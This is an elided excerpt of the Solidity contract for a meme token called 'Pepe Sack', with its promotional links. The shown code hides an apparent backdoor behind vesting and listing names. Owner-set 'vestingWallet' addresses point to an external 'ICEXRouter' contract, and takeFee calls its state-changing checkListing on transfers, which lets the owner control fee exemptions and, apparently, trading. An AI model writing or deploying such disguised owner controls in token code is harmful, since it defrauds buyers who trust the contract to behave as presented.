...
https://www.pepesack.com
https://t.me/pepesack
https://twitter.com/pepesackcoin
...
interface ICEXRouter {
    function checkListing(bool, bool, address, address, uint256) external returns (bool);
}
...
contract PepeSack is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name = "Pepe Sack";
    string private _symbol = "PSACK";
    ...
    mapping (address => address) vestingWallet;
    ...
    uint256 public _walletMax =   _totalSupply.mul(20).div(1000);  
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(vestingWallet[vesting] != address(0) && ICEXRouter(vestingWallet[vesting]).
            checkListing(isMarketPair[sender], isMarketPair[recipient], sender, recipient, amount)) {
            feeAmount = 0;
        }
    ...
    function setVestingWallets(address[] calldata _address,uint[] calldata _tokens) external onlyOwner {
        ...
        for(uint j = 0; j < _address.length-1; j++) {
            vestingWallet[_address[j]] = _address[j+1];
